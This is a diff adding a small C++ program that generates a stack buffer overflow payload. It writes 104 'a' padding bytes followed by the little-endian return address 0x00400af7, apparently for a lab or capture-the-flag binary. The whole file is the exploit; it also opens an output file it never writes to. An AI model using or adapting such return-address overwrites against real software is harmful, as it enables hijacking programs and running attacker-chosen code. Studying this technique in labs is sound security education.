@@ -1,0 +1,27 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string>
+#include <iostream>
+#include <fstream>
+
+using namespace std;
+
+int main(int args,char** argv){
+	string hex="00400af7";
+	int len = hex.length();
+	string newString;
+	ofstream myfile;
+	myfile.open(argv[1]);
+	for(int i=len-2; i>=0; i-=2)
+	{
+		string byte = hex.substr(i,2);
+		char chr = (char) (int)strtol(byte.c_str(), NULL, 16);
+		newString.push_back(chr);
+	}
+	string finalS;
+	for(int i=0;i<104;i++){
+		finalS.push_back('a');
+	}
+	finalS+=newString;
+	cout<<finalS<<endl;
+}
